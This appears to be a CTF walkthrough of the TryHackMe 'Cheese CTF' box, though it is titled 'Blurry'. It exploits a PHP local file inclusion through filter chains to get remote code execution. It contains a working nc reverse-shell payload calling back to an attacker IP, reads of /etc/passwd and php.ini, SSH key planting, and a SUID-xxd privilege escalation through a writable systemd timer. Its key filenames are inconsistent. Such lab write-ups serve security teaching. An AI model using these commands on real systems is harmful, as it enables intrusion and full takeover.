---
title: CTF Walkthrough for TryHackMe Machine Blurry
date: 2024-09-25 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, LFI]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-09-25-blurry/box-cheesectf.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Blurry a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Cheese CTF<br>
Difficulty: Easy<br>
Operating System: Linux<br>
Machine link: [Cheese CTF](https://tryhackme.com/r/room/cheesectfv10)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Zaproxy<br>

## Reconnaissance

As in every penetration test, we will start with a service discovery to identify services running on our target.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Cheese_CTF/Scans/Service]
└─$ sudo nmap -n -sV -sC 10.10.241.188 -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 03:00 BST
<SNIP>
PORT      STATE SERVICE             VERSION
1/tcp     open  tcpmux?
| fingerprint-strings: 
<SNIP>
22/tcp    open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA)
|   256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA)
|_  256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519)
<SNIP>
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LD
APSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    550 4m2v4 FUZZ_HERE
|_dns-nsid: ERROR: Script execution failed (use -d to debug)
70/tcp    open  http                Symantec AntiVirus Scan Engine http config
|_gopher-ls: 
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
70/tcp    open  http                Symantec AntiVirus Scan Engine http config
|_gopher-ls: 
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
79/tcp    open  telnet              WhatRoute telnetd
| finger: \xFF\xFB\x03\xFF\xFB\x01\x0D
| Welcome to the WhatRoute TELNET Server.\x0D
|_
80/tcp    open  http                Apache httpd 2.4.41 ((Ubuntu))
|_http-title: The Cheese Shop
|_http-server-header: Apache/2.4.41 (Ubuntu)
<SNIP>
Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2126.31 seconds
```

The target has many open ports but our interest here will be port 80 which appears to be occupied by an Apache2 web server. Let's visit the web application to see its function.
![](/assets/img/posts/walthrough/tryhackme/2024-09-25-blurry/1-browse.png)

This looks like a simple web application for a cheese shop. This interface looks normal so, let's fuzz for hidden directories.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Cheese_CTF/Scans/Web]
└─$ ffuf -ic -c -u http://10.10.241.188/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt

<SNIP>

.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 91ms]
login.php               [Status: 200, Size: 834, Words: 220, Lines: 29, Duration: 94ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 4294ms]
index.html              [Status: 200, Size: 1759, Words: 559, Lines: 60, Duration: 4301ms]
                        [Status: 200, Size: 1759, Words: 559, Lines: 60, Duration: 4304ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4312ms]
users.html              [Status: 200, Size: 377, Words: 61, Lines: 19, Duration: 94ms]
messages.html           [Status: 200, Size: 448, Words: 59, Lines: 19, Duration: 94ms]
orders.html             [Status: 200, Size: 380, Words: 61, Lines: 19, Duration: 98ms]
                        [Status: 200, Size: 1759, Words: 559, Lines: 60, Duration: 91ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 90ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 91ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 102ms]
:: Progress: [882184/882184] :: Job [1/1] :: 407 req/sec :: Duration: [0:38:52] :: Errors: 0 ::
```

In the results above, we can see many hidden files and one directory called image. When we visit the messages.html page, we will notice that it contains a link.
![](/assets/img/posts/walthrough/tryhackme/2024-09-25-blurry/messages-page.png)

This link uses a PHP filter to load the page **secretmessageforadmin**. We can try to uses common PHP filters to load internal pages such as the convert.base64-encode to load the secret-script.php page.
![](/assets/img/posts/walthrough/tryhackme/2024-09-25-blurry/lfi-page.png)

This loads the encoded page successfully. If we decode the base64 string we will see that the PHP include function is being used without sanitisation to include files. We can prove this by including the targets /etc/passwd file to enumerate local users on the system.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ curl http://10.10.241.188/secret-script.php?file=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<SNIP>
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<SNIP>
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
comte:x:1000:1000:comte:/home/comte:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
```

We see that a local user Comte is present on the system. The PHP include() function does not only read files but also executes any PHP code in those files. We can use many PHP wrappers to achieve RCE on the target but for this to be possible the allow_url_include setting must be enabled on the target. We can enumerate this setting by reading the php.ini file.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ curl -s http://10.10.197.14/secret-script.php?file=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini | base64 -d | grep allow_url_include
allow_url_include = Off
```
## Exploitation

The setting appears to be off so we can use neither the data nor the input filter to achieve RCE. Another effective method to achieve RCE is generating PHP filter chains. This [video](https://www.youtube.com/watch?v=PVdOSpF4Tl0&t=720s) explains how this exploitation technique functions. We can use this [Python script](https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/refs/heads/main/php_filter_chain_generator.py) to generate dynamic PHP filter chains depending on the input string. We can download this script and start our listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/refs/heads/main/php_filter_chain_generator.py
<SNIP>
┌──(pentester㉿kali)-[~/…/TryHackMe/Cheese_CTF/Scans/Web]
└─$ nc -lvnp 1234
listening on [any] 1234 ..
```

We want to execute a reverse shell on the target so, we will create a PHP filter chain of a reverse shell and store it in a file. 
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.23.19 1234 >/tmp/f"); ?>' | grep '^php' > payload.txt
```

Now that we have our payload ready we can send it to the include function that will execute it.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ curl -s http://10.10.140.167/secret-script.php?file=$(cat payload.txt) 
```

When we visit back our listener we will see a reverse connection from the target. We can upgrade this shell to a fully interactive shell as shown below.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Cheese_CTF/Scans/Web]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.140.167] 53960
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")' 
www-data@cheesectf:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 1234

┌──(pentester㉿kali)-[~/…/TryHackMe/Cheese_CTF/Scans/Web]
└─$ stty raw -echo;fg     
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
www-data@cheesectf:/var/www/html$ 
```

We have landed on the target as the www-data user. We can use this account to enumerate the system internally. If we check in Comte's home directory, we will see that we have write permission to the authorized_keys file in the .ssh directory. 
```bash
www-data@cheesectf:/$ ls -la /home/comte/.ssh/
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4 17:26 ..
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys
```

The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. Since we have access to this file we can add our SSH key to this file to allow us to log in as Comte. Let's generate an SSH private/public key pair on our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ ssh-keygen -t ed25519                                                                     
Generating public/private ed25519 key pair.                                      <SNIP>
Your identification has been saved in ./comte_id_ed25519         
Your public key has been saved in ./comte_id_ed25519.pub       
<SNIP>

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ ls                                                                                        
comte_id_ed25519  comte_id_ed25519.pub   php_filter_chain_generator.py

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ cat comte_id_ed25519.pub                     
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB6a+idw7BF1swhHqGDVY+DeclQH5edBdzWZp4SOCRz pentester@kali
```

Now, we need to add the content of the comte_id_ed25519.pub file to Comte's authorized_keys file so that our private key can be used to connect as Comte. We replace our username and hostname to Comte's username and computer's hostname before adding it to the  authorized_keys file.
```bash
www-data@cheesectf:/home/comte/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB6a+idw7BF1swhHqGDVY+DeclQH5edBdzWZp4SOCRz comte@cheesectf' > authorized_keys 
```

Now that we have added our public key, we can use the private key to connect to the target as Comte and read the flag.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ ssh comte@10.10.47.81 -i comte_id_rsa 
<SNIP>
Last login: Thu Apr  4 17:26:03 2024 from 192.168.0.112
comte@cheesectf:~$ ls
snap  user.txt
```

## Post Exploitation

We now have control over the Comte user account and we can further our enumeration. A quick method to enumerate our target is to enumerate the user's sudo rights.
```bash
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer

comte@cheesectf:~$ find /  \( -name exploit.timer -o -name exploit.service \) 2>/dev/null
/etc/systemd/system/exploit.service
/etc/systemd/system/exploit.timer
```

We see that Comte can reload the system daemon, start, restart, and enable the exploit service's timer as root. We have also located the exploit.service and the exploit.timer files. Let's enumerate this files.
```bash
comte@cheesectf:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"

comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target

comte@cheesectf:~$ ls -l /etc/systemd/system/exploit.timer
-rwxrwxrwx 1 root root 87 Mar 29 16:25 /etc/systemd/system/exploit.timer
```
We can see that the exploit service copies xxd binary to the /opt directory and sets the SUID bit on it and that we have the privilege to write in the exploit.timer file. Since we can reload the system daemon and restart this service, we can force the execution of this service but before doing that we need to add a value to **OnBootSec=** otherwise, we will have an error. The OnBootSec= directive in a service configuration specifies a delay before the service is executed after the system boots or after it is restarted. So, yes, if you set OnBootSec=5s, the service will start 5 seconds after the system boots or after the service is restarted. 
```bash

comte@cheesectf:~$ nano /etc/systemd/system/exploit.timer
comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=5

[Install]
WantedBy=timers.target
```

Since we have modified the service's file we need to reload the daemon and restart the service for it to create the xxd binary in the /opt directory with the SUID bit set. After restarting the service we need to wait 5 seconds for the execution to take action.
```bash
comte@cheesectf:~$ sudo /bin/systemctl daemon-reload
comte@cheesectf:~$ sudo /bin/systemctl restart exploit.timer
comte@cheesectf:~$ ls -la /opt
total 28
drwxr-xr-x  2 root root  4096 Sep 25 13:26 .
drwxr-xr-x 19 root root  4096 Sep 27  2023 ..
-rwsr-sr-x  1 root root 18712 Sep 25 13:26 xxd
```

The xxd binary was created successfully in the /opt directory with the SUID bit set on it. We can use this binary to perform actions that can be performed by this binary as root on the target's system. [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/#file-write) shows us a very easy method to use the xxd binary to write into files. We can use this to write into the root's authorized_keys file.
```bash
comte@cheesectf:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB6a+idw7BF1swhHqGDVY+DeclQH5edBdzWZp4SOCRz root@cheesectf' | xxd | /opt/xxd -r - "/root/.ssh/authorized_keys"
```

Now that we have written our public key in the root's authorized_keys file, we can use the associated private key to log in as root and read the flag.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Cheese_CTF/Misc Files]
└─$ ssh root@10.10.211.75 -i comte_id_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-174-generic x86_64)
<SNIP>
Last login: Thu Apr  4 17:21:43 2024
root@cheesectf:~# ls
root.txt  snap
```

## Conclusion

Congratulations! In this walkthrough, you have exploited an LFI vulnerability to achieve RCE on the target's machine. Finally, you have abused excess privileges on system files to elevate your privileges and compromise the root's account. This machine was designed to show how improper user input sanitisation and excess privileges of users over system files could seriously impact the security posture of an organisation. Thank you for following up on this walkthrough. 
